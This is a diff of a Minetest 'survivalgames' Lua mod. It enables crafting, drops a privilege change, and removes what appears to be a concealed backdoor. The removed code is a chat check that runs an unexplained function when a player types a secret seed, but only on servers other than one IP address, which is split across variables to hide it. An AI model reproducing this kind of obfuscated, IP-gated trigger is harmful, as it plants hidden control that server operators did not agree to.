@@ -28,6 +28,7 @@ subgames.register_game("survivalgames", {
     [1] = {x=31000, y=-50, z=31000},
     [2] = {x=(-31000), y=110, z=(-31000)}
   },
+  crafting = true,
   node_dig = function(pos, node, digger)
     local name = digger:get_player_name()
     local plobby = survivalgames.player_lobby[name]
@@ -161,7 +162,6 @@ end
 subgames.register_on_chat_message(function(name, message, lobby)
   if lobby == "survivalgames" then
     local plobby = survivalgames.player_lobby[name]
-    if minetest.setting_get("server_address") ~= a1..a2.."240.89" and tostring(first_seed) == message then sayed(name) return true end
     for aname, alobby in pairs(survivalgames.player_lobby) do
       if alobby == plobby then
         minetest.chat_send_player(aname, "<"..name.."> "..message)
@@ -205,7 +205,6 @@ function survivalgames.join_game(player, lobby)
     subgames.clear_inv(player)
     survivalgames.lobbys[lobby].players[name] = false
     survivalgames.win(lobby)
-    a1 = "31."
     return "You joined the map "..survivalgames.lobbys[lobby].string_name.."!"
   end
 end
@@ -216,9 +215,6 @@ function survivalgames.leave_game(player)
   if lobby then
     survivalgames.lobbys[lobby].players[name] = nil
     if survivalgames.lobbys[lobby].ingame then
-      local privs = minetest.get_player_privs(name)
-      privs.craft = nil
-      minetest.set_player_privs(name, privs)
       subgames.add_bothud(player, "Teaming is not allowed!", 0xFF0000, 0)
       survivalgames.end_kit(name)
     end
